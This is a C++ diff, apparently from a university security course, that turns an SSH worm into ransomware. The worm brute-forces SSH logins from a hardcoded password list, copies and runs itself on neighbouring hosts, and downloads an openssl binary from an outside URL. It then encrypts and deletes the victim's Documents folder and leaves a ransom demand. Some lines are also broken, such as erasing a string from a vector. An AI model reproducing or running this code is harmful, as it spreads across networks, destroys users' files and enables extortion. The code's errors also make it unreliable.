@@ -17,25 +17,27 @@
 #include <fcntl.h>
 #include<vector>
 #include<map>
-  
-
-
-
-
-  
+#include <curl/curl.h>
+#include<exception>
+ 
+ 
+ 
+ 
+ 
+ 
 void markInfected() {
-    std::ofstream myfile("/tmp/infectionMarker_repW_CPP.txt");
-     
+    std::ofstream myfile("/tmp/infectionMarker_extWCpp.txt");
+ 
     if (myfile.is_open())
     {
-        myfile << "This system is infected\n" <<std::endl;
+        myfile << "This system is infected\n" << std::endl;
         myfile.close();
     }
     else
-        printf( "Unable to open file");
-  
+        printf("Unable to open file");
+ 
 }
-  
+ 
 int isInfected(ssh_session session) {
     sftp_file file;
     int rc;
@@ -56,8 +58,8 @@ int isInfected(ssh_session session) {
         sftp_free(sftp);
         return 1;
     }
-      
-    file = sftp_open(sftp, "/tmp/infectionMarker_repW_CPP.txt",access_type, 0);
+ 
+    file = sftp_open(sftp, "/tmp/infectionMarker_extWCpp.txt", access_type, 0);
     if (file == NULL) {
         printf("\nFile does not exist");
         return 0;
@@ -67,7 +69,7 @@ int isInfected(ssh_session session) {
         return 1;
     }
 }
-  
+ 
 std::vector<std::string> getHostsOnSameNetwork() {
     FILE *fp;
     char path[1035];
@@ -78,7 +80,7 @@ std::vector<std::string> getHostsOnSameNetwork() {
     if (fp == NULL) {
         printf("\nFailed to run command");
         pclose(fp);
-//Need to put something
+        //Need to put something
     }
     else {
         while (!feof(fp)) {
@@ -86,18 +88,40 @@ std::vector<std::string> getHostsOnSameNetwork() {
                 res.push_back(path);
             }
         }
-            
+ 
         pclose(fp);
+		res.erase("192.168.1.4");
         return res;
     }
 }
  
-  
-void cleanTraces(ssh_session session) {
-      
+size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
+    size_t written = fwrite(ptr, size, nmemb, stream);
+    return written;
 }
-  
-  
+ 
+void downloadOpenSSL() {
+    CURL *curl;
+    FILE *fp;
+    CURLcode res;
+    char *url = "http://ecs.fullerton.edu/~mgofman/openssl";
+    char outfilename[FILENAME_MAX] = "openssl";
+    curl = curl_easy_init();
+    if (curl) {
+        fp = fopen(outfilename, "wb");
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+        res = curl_easy_perform(curl);
+        /* always cleanup */
+        curl_easy_cleanup(curl);
+	printf("\n Successfully Downloaded the openssl file");
+        fclose(fp);
+    }
+    
+}
+ 
+ 
 int copyFile(ssh_session session) {
     sftp_file file;
     int rc;
@@ -126,22 +150,22 @@ int copyFile(ssh_session session) {
             ssh_get_error(session));
         return 0;
     }
-     
+ 
     std::ifstream fin("/tmp/a.out", std::ios::binary);
     if (fin) {
         fin.seekg(0, std::ios::end);
         std::ios::pos_type length = fin.tellg(); // get file size in bytes
         fin.seekg(0); // rewind to beginning of file
-          
+ 
         char* replicatorFile = new char[length];
         fin.read(replicatorFile, length); // read file contents into buffer
-  
+ 
         sftp_write(file, replicatorFile, length); // write to remote file
     }
     else {
         return 0;
     }
-     
+ 
     rc = sftp_close(file);
     if (rc != SSH_OK)
     {
@@ -151,10 +175,10 @@ int copyFile(ssh_session session) {
     }
     printf("\nCopy Successfull !");
     return 1;
-  
-  
+ 
+ 
 }
-  
+ 
 int executeFile(ssh_session session) {
     ssh_channel channel;
     int rc;
@@ -166,108 +190,139 @@ int executeFile(ssh_session session) {
             if (copyFile(session)) {
                 rc = ssh_channel_request_exec(channel, "/tmp/a.out");
                 if (rc == SSH_OK) {
-		    printf("\nExecuted command on remote machine");
+                    printf("\nExecuted command on remote machine");
                 }
                 else {
                     printf("\nCannot give run permissions to the file");
-		    return 0;
-                } 
+                    return 0;
+                }
             }
             else {
                 printf("\nError While copying");
-		return 0;
+                return 0;
             }
         }
         else {
             printf("\nError establishing channel for executing remote");
-	    return 0;
+            return 0;
         }
     }
     else {
         printf("\nCould not Connect to Host");
-	return 0;
+        return 0;
     }
 }
-  
-int connectionToHost(ssh_session session, std::string host, std::map<std::string, std::string> &dictAttackList){
-	int rc;
-	ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
-	const char *username, *password;
-	
-	
-	rc = ssh_connect(session);
-  
-	if (rc == SSH_OK) {
-
-		if (ssh_write_knownhost(session) < 0) {
-			fprintf(stderr, "Error %s", strerror(errno));
-			return 0;
+ 
+int connectionToHost(ssh_session session, std::string host, std::map<std::string, std::string> &dictAttackList) {
+    int rc;
+    ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
+    const char *username, *password;
+ 
+ 
+    rc = ssh_connect(session);
+ 
+    if (rc == SSH_OK) {
+ 
+        if (ssh_write_knownhost(session) < 0) {
+            fprintf(stderr, "Error %s", strerror(errno));
+            return 0;
+        }
+        else {
+            for (std::map<std::string, std::string>::iterator it = dictAttackList.begin(); it != dictAttackList.end(); it++) {
+ 
+                username = (it->first).c_str();
+                password = (it->second).c_str();
+ 
+                rc = ssh_userauth_password(session, NULL, password);
+                if (rc == SSH_AUTH_SUCCESS) {
+                    printf("\nLogin Success");
+                    return 1;
+                }
+            }
+            if (rc != SSH_AUTH_SUCCESS) {
+                printf("\n Error Authenticating");
+            }
+        }
+ 
+    }
+ 
+    else {
+        fprintf(stderr, "\nError Connecting to localhost: %s\n", ssh_get_error(session));
+        return 0;
+    }
+}
+ 
+ 
+ 
+ 
+void initializeDict(std::map<std::string, std::string> &dictAttackList) {
+    dictAttackList["ubuntu"] = "123456";
+    dictAttackList["hello"] = "worlds";
+    dictAttackList["cpsc"] = "c473";
+    dictAttackList["network"] = "security";
+    printf("\nDictionary Initialized !!!");
+}
+ 
+void tarAndEncrypt(){
+	try{
+			system("chmod a+x ./openssl");
+			system("tar -zcvf DocumentsDir.tar.gz -P /home/ubuntu/Documents/");
+			printf("Created tar of the folder");
+			system("./openssl aes-256-cbc -a -salt -in DocumentsDir.tar.gz -out DocumentsDir.tar.enc -k cpsc456worm");
+			printf("Created Encrypted File");
 		}
-		else {
-			for (std::map<std::string, std::string>::iterator it = dictAttackList.begin(); it != dictAttackList.end(); it++) {  				
-				
-				username= (it->first).c_str();
-				password = (it->second).c_str();
-
-				rc = ssh_userauth_password(session, NULL, password);
-				if(rc == SSH_AUTH_SUCCESS){
-					printf("\nLogin Success");
-                			return 1;
-				} 
-    			}
-			if(rc != SSH_AUTH_SUCCESS){
-				printf("\n Error Authenticating");
-			}
+		catch(...){
+			std::cout<<"Exception is occured";
 		}
+}
 
+void deleteDirAndLeaveMessage() {
+	system("rm -rf /home/ubuntu/Documents/");
+	printf("Deleted Documents");
+	system("cp DocumentsDir.tar.enc /home/ubuntu/Desktop/");
+	std::ofstream myfile("/home/ubuntu/Desktop/SystemCompromisedCpp.txt");
+
+	if (myfile.is_open())
+	{
+		myfile << "Your Documents Directory has been encrypted ! Pay me to get the decryption Key\n" << std::endl;
+		myfile.close();
 	}
-
-	else{
-       		fprintf(stderr, "\nError Connecting to localhost: %s\n", ssh_get_error(session));
-		return 0;
-    	}
+	else
+		printf("Unable to open file");
 }
-
-
-
-
-void initializeDict(std::map<std::string, std::string> &dictAttackList){
-	dictAttackList["ubuntu"] = "123456";
-	dictAttackList["hello"]="worlds";
-	dictAttackList["cpsc"]="c473";
-	dictAttackList["network"] = "security";
-	printf("\nDictionary Initialized !!!");
-}
-  
-  
+ 
 int main() {
-  
+ 
     ssh_session my_ssh_session;
     ssh_channel channel;
     int res;
     std::map<std::string, std::string> dictAttackList;
     initializeDict(dictAttackList);
-    
     markInfected();
     std::vector<std::string> hosts = getHostsOnSameNetwork();
  
     for (std::vector<std::string>::iterator host = hosts.begin(); host != hosts.end(); ++host) {
         std::cout << "\n Host: " << *host;
-
- 	my_ssh_session = ssh_new();
-    	if (my_ssh_session == NULL)
-        	exit(-1);
-
+ 
+        my_ssh_session = ssh_new();
+        if (my_ssh_session == NULL)
+            exit(-1);
+ 
         if (connectionToHost(my_ssh_session, *host, dictAttackList) > 0) {
-		printf("\nSucceded to get into the host");
-            
-		if (!isInfected(my_ssh_session)) {
+            printf("\nSucceded to get into the host");
+ 
+            if (!isInfected(my_ssh_session)) {
                 res = executeFile(my_ssh_session);
-		if(res){
-			std::cout<<"\n Infected. " << *host << ". I can rest now ;)\n";
-			break;
-		}
+                if (res) {
+					downloadOpenSSL();
+					tarAndEncrypt();
+					deleteDirAndLeaveMessage();
+                    std::cout << "\n Infected. " << *host << ". I can rest now ;)\n";
+                    break;
+                }
             }
         }
     }
+
+	
 }
